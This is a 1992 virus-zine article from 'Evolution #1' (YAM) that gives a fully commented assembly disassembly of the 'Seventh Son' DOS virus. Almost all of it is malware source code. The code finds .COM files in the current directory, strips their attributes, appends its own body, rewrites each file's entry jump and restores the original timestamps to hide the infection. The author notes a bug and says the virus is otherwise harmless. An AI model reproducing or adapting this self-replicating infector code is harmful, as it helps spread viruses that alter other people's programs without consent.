

ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #1 - YAM '92

Article Title: 7Son 4 Virus Disassembly
Author: Admiral Bailey


;*****************************************************************************
; Seventh Son of a Seventh Son v4.0 Virus
;
; Disassembled By: Admiral Bailey [YAM]
;
; The person or group of persons that wrote this virus to me are unknown, so
; you should have put your name in it, anyhow
;
; Notes: This virus I found not to long ago, and got bored one day, so I
;        Disassembled it.  There is nothing really special about this virus.
;        Just your basic everyday type of .COM infecting virus.  Took me 1
;        minute to dissassemble it with sourcer and 5-10 minutes to add
;        comments.  The code for some reason doesn't seem to work due to a
;        small bug somewhere that I can't be bothered to find.
;
;        But in this mag, the first issue of Evolution, I will include the
;        Dissassembly, This is my first dissassembly and I tried to make it
;        good by learning some stuff from Data Dissruptor when he did the
;        Otto virus (a Virus by YAM).  7th Son does nothing bad nor does it
;        distroy anything.  All it does is infect every com file in the
;        current directory.  It saves the dates and times also.  For more
;        information on what this virus does, take a look at VSUMx206.zip or
;        the previous ones, Well enjoy..
;
;*****************************************************************************

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
                org     100h

a7son4org       proc    far

start:
                dec     bp
                jmp     begin
                db      0CDh, 20h, 00h, 00h
begin:
                cld                             ; a bit obvious
                mov     si,100h                 ; beginning of program
                push    si
                mov     di,si
                add     si,[si+2]
                push    si
                movsw                           ; Mov [si] to es:[di]
                movsw                           ; Mov [si] to es:[di]
                pop     si
                mov     ax,3300h                ; gets ctrl-break flag
                int     21h                     ; returns status in dl

                push    dx
                cwd                             ; Word to double word
                inc     ax
                push    ax
                int     21h                     ; sets the ctrl-break flag to
                                                ; off
                mov     ax,3524h                ; get int vector 24h
                int     21h

                push    bx
                push    es
                lea     dx,[si+0EDh]            ; get new it 24
                mov     ah,25h                  ; sets the new int 24
                push    ax
                int     21h


                int     21h                     ; puts the DTA into es:bx

                push    es                      ; save part 1 of dta
                push    bx                      ; save part 2 of dta
                add     dx,70h                  ; new dta
                mov     ah,1Ah                  ; set dta
                int     21h

                add     dx,1Eh                  ; here im confused
                push    dx                      ;      | |
                lea     di,[si+0F0h]            ; Load effective addr
                cmp     word ptr [di],707h      ;   ___\_/___
                jne     find_first_file         ; find the first file
                lea     dx,[di+2]               ; gets the string to display
                mov     ah,9                    ; display string
                int     21h

find_first_file:
                mov     ax,[di]
                xchg    ah,al
                mov     al,1
                mov     [di],ax
                lea     dx,[di+21h]             ; get type of files to find
                xor     cx,cx                   ; find normal files
                mov     ah,4Eh                  ; find first file command
find_file:                                      ; loc_3:
                int     21h                     ; find file

                pop     dx
                jc      quit                    ; no files found then quit
                push    dx
                xor     cx,cx                   ; attrib type 0
                mov     ax,4301h                ; set attributes to none
                int     21h                     ; ds:dx holds file name

                jc      find_next_file          ; if error find another file
                mov     ax,3D02h                ; open file read/write
                int     21h

                jc      find_next_file          ; if error find another file
                xchg    ax,bx                   ; bx has handle
                mov     ax,5700h                ; get files date+time
                int     21h                     ; cx=time dx=time

                push    cx                      ; save the old files date
                push    dx                      ; and time
                mov     cx,4                    ; read 4 bytes
                mov     dx,si                   ; save them here
                mov     ah,3Fh                  ; read file
                int     21h

                cmp     byte ptr [si],4Dh       ; 'M'
                je      fix_file                ; fix back the file
                cmp     byte ptr [si],5Ah       ; 'Z'
                je      fix_file                ; fix back the file
                mov     al,2
                call    mov_file_ptr
                cmp     ax,0FEA4h
                jae     fix_file                ; fix back the file
                cmp     ax,3E8h
                jbe     fix_file                ; Jump if below or =
                push    ax
                mov     cx,11Ch                 ; size of virus to write
                mov     ah,40h                  ; write virus to file
                int     21h                     ; ds:dx from buffer

                cmp     ax,cx                   ; were all bytes written
                pop     ax
                jnz     fix_file                ; nope then find another file
                xchg    ax,bp                   ; else
                mov     al,0
                call    mov_file_ptr
                mov     word ptr [si],0E94Dh
                mov     [si+2],bp
                mov     ah,40h                  ; write back the four bytes
                                                ; read earlier
                int     21h

                inc     byte ptr [di]
fix_file:
                pop     dx                      ; get old date / time
                pop     cx
                mov     ax,5701h                ; set the files date/time back
                int     21h

                mov     ah,3Eh                  ; close up the file now
                int     21h

find_next_file:
                mov     ah,4Fh                  ; find the next file
                jmp     short find_file
quit:
                pop     dx
                pop     ds
                mov     ah,1Ah
                int     21h                     ; set the dta back

                pop     ax
                pop     ds
                pop     dx
                int     21h                     ; ??INT Non-standard interrupt
                pop     ax
                pop     dx
                int     21h                     ; now quit the program

                push    cs
                push    cs
                pop     ds
                pop     es
                retn

a7son4org       endp

;*****************************************************************************
;  Just a subroutine that moves the file pointer
;*****************************************************************************

mov_file_ptr    proc    near                    ; sub_1
                mov     ah,42h                  ; mov the file ptr
                                                ; cx,dx=offset al=method
                cwd                             ; Word to double word
                xor     cx,cx
                int     21h

                mov     cl,4
                mov     dx,si
                retn
mov_file_ptr    endp


;*****************************************************************************
;  New int 24 handler
;*****************************************************************************

int_24h_entry   proc    far
                mov     al,3
                iret                            ; Interrupt return
int_24h_entry   endp

                db      1, 1
data_2          db      'Seventh son of a seventh son', 0Dh
                db      0Ah, '$'                        ; this messege is
                                                        ; displayed
                db       2Ah, 2Eh, 43h, 4Fh, 4Dh, 00h   ; type of files to get
                                                        ; '*.com'
                db       82h,0A8h,0B0h,0B3h,0B1h

seg_a           ends

                end     start



